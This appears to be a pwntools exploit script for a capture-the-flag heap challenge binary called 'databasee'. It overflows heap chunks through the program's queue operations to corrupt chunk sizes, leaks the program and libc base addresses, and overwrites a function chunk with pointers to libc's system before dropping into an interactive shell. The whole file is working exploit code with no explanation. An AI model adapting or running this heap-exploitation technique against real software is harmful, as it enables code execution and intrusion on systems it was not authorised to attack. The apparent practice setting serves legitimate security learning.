#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("databasee")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# context.log_level='debug'
# p = remote("addr", 1337)
p = process([exe.path])
def GDB():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript="""
decompiler connect ida
               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def cr_arr(buffer, size = 16):
    chunk_size = size
    chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
    return chunks
def rev(b):
    return "".join(b[len(b) - i - 1] for i in range(len(b)))
def convert_addr(buff):
    arr = cr_arr(buff, 2)
    arr.reverse()
    return eval("0x" + "".join(arr))
class queue():
    def __init__(self,queue_list) -> None:
        self.queue_list = queue_list
    def run(self,option):
        if option == 2:
            s(p32(option) + p32(0))
            return
        else:
            queue_len = len(queue_list)
            if queue_len != 1 and (option == 1 or option == 3):
                print(f"queue_len: {queue_len}")
                print(f"option: {option}")
                print("wrong size of queue list for this option")
                return
            elif queue_len != 3 and option == 4:
                print("wrong size of queue list for this option")
                return               
            s(p32(option) + p32(queue_len))
            # input("num size-> ")
            for i in range(queue_len):
                queue = queue_list[i]
                s(p16(len(queue)))
                s(queue)
                # for j in range(len(queue)):
                    # input(f"input {i}: ")
p.recvuntil("...")
push = 1
pop = 2
push_func = 3
proces = 4
rm_func = 5

queue_list = [b"\0\0\0\0".ljust(0xff0 + 0x10 - 0x8, b"a")] 
new2 = queue(queue_list)
queue_list = [b"\0\0\0\0".ljust(0xff0, b"a")] 
new2.run(push)
queue_list = [b"\0\0\0\0".ljust(0xff0 + 0x8 - 0x8, b"a") + p64(0xcafebabedeadbeef)] 
new2.run(push)
new2.run(pop) # take the first put chunk in queue
p.recvuntil("getStr :")
p.recv(0xfff)
new2.run(push_func)
#############overwrite size next chunk
queue_list = [b"\0\0\0\0", b"a" * 0xff0, b"a"*0xd]
new2.run(proces)
queue_list = [b"\0\0\0\0", p32(0x1008), ""]
new2.run(proces)
new2.run(pop)
p.recvuntil("BEBAFECA")
# #################
addr = cr_arr(p.recv(32).decode())

exe.address = convert_addr(addr[0]) - 0x5028
lor = convert_addr(addr[1])
log.info(f"{hex(exe.address) = }")
log.info(f"{hex(lor) = }")
next_leak = exe.address + 0x4fc8
log.info(f"{hex(next_leak) = }")
queue_list = [b"\0\0\0\0".ljust(0xff0 - 0x8, b"a") + p64(0xfefefebabecadead) + p64(0)] 
new2.run(push)
#############overwrite size next chunk continue
queue_list = [b"\0\0\0\0", b"\0" * 2 + p64(next_leak), ""]
new2.run(proces)
new2.run(pop)
p.recvuntil("ADDECABEBAFEFEFE")
addr = p.recv(16).decode()
libc.address = convert_addr(addr) - 0x2046a8
log.info(f"{hex(libc.address) = }")
### reallocate popped chunk
queue_list = [b"\0\0\0\0".ljust(0xff0 - 0x8, b"a") + b"overwrit" + p64(0)] 
new2.run(push)
########### reallocate func_chunk to reinitialize the size
# queue_list = [p32(0)]
# new2.run(rm_func)
# new2.run(push_func)
#############overwrite func chunk
for i in range(35):
    queue_list = [b"\0\0\0\0", b"".ljust(0xff0, b"\0"), b"\0"*0xd]
    new2.run(proces)
queue_list = [b"\0\0\0\0", (p64(libc.sym.system) * 3).ljust(0xff0, b"\0"), b"\0"*0xd]
new2.run(proces)
target = lor - 4145
place = lor -151584
# GDB()
queue_list = [b"\0\0\0\0", b"".ljust(0x12,b"\0") + p64(0)*2 + p64(target) + p64(libc.address + 0x1cb42f) + p64(place)*2, b"\0"*0xd]
new2.run(proces)
new2.run(proces)
# queue_list = [b"\0\0\0\0", p32(0x1008), ""]
# new2.run(proces)
# new2.run(pop)



p.interactive()
# good luck pwning :)

